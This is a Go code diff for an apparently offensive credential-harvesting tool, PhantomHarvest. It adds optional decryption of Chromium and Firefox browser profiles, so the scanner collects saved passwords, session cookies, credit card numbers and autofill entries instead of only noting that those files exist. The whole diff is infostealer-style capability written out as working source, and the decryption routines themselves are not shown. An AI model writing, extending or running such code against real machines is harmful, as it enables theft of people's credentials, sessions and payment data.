@@ -7,6 +7,8 @@ import (
 	"regexp"
 	"runtime"
 	"strings"
+
+	"github.com/phantom-offensive/PhantomHarvest/internal/decrypt"
 )
 
 // Browser profile paths by OS
@@ -135,7 +137,13 @@ func (s *Scanner) scanBrowsers() {
 				// Check for Login Data (saved passwords)
 				loginPath := filepath.Join(profileDir, browser.loginDB)
 				if _, err := os.Stat(loginPath); err == nil {
-					s.extractChromiumLogins(loginPath, browser.name)
+					decrypted := false
+					if s.DecryptBrowsers {
+						decrypted = s.decryptChromiumProfile(profileDir, browser.name)
+					}
+					if !decrypted {
+						s.extractChromiumLogins(loginPath, browser.name)
+					}
 				}
 
 				// Check for History (URLs with auth)
@@ -161,6 +169,56 @@ func (s *Scanner) scanBrowsers() {
 	}
 }
 
+// decryptChromiumProfile invokes the decrypt package and converts results
+// into harvest.Findings. Returns true if at least one decrypted finding was
+// produced (in which case the discovery-only fallback is skipped).
+func (s *Scanner) decryptChromiumProfile(profileDir, browserName string) bool {
+	if !decrypt.Enabled() {
+		fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
+		return false
+	}
+	results, err := decrypt.DecryptChromiumProfile(profileDir, browserName)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[!] decrypt %s: %v\n", browserName, err)
+		return false
+	}
+	any := false
+	for _, d := range results {
+		if d.Type == "saved_password" || d.Type == "cookie" || d.Type == "credit_card" || d.Type == "autofill" {
+			any = true
+		}
+		s.addFinding(Finding{
+			Category: d.Category, Type: d.Type, File: d.File,
+			Key: d.Key, Value: d.Value, Confidence: d.Confidence,
+		})
+	}
+	return any
+}
+
+// decryptFirefoxProfile invokes the decrypt package for a Firefox profile.
+func (s *Scanner) decryptFirefoxProfile(profileDir, browserName string) bool {
+	if !decrypt.Enabled() {
+		fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
+		return false
+	}
+	results, err := decrypt.DecryptFirefoxProfile(profileDir, browserName)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[!] decrypt %s: %v\n", browserName, err)
+		return false
+	}
+	any := false
+	for _, d := range results {
+		if d.Type == "saved_password" {
+			any = true
+		}
+		s.addFinding(Finding{
+			Category: d.Category, Type: d.Type, File: d.File,
+			Key: d.Key, Value: d.Value, Confidence: d.Confidence,
+		})
+	}
+	return any
+}
+
 // scanFirefoxProfiles enumerates Firefox profile directories.
 func (s *Scanner) scanFirefoxProfiles(profilesDir string, browser browserProfile) {
 	entries, err := os.ReadDir(profilesDir)
@@ -177,6 +235,9 @@ func (s *Scanner) scanFirefoxProfiles(profilesDir string, browser browserProfile
 		// Check for logins.json (Firefox stores creds in JSON, encrypted with NSS)
 		loginsPath := filepath.Join(profDir, "logins.json")
 		if _, err := os.Stat(loginsPath); err == nil {
+			if s.DecryptBrowsers && s.decryptFirefoxProfile(profDir, browser.name) {
+				continue
+			}
 			s.addFinding(Finding{
 				Category:   "Browser",
 				Type:       "firefox_logins",
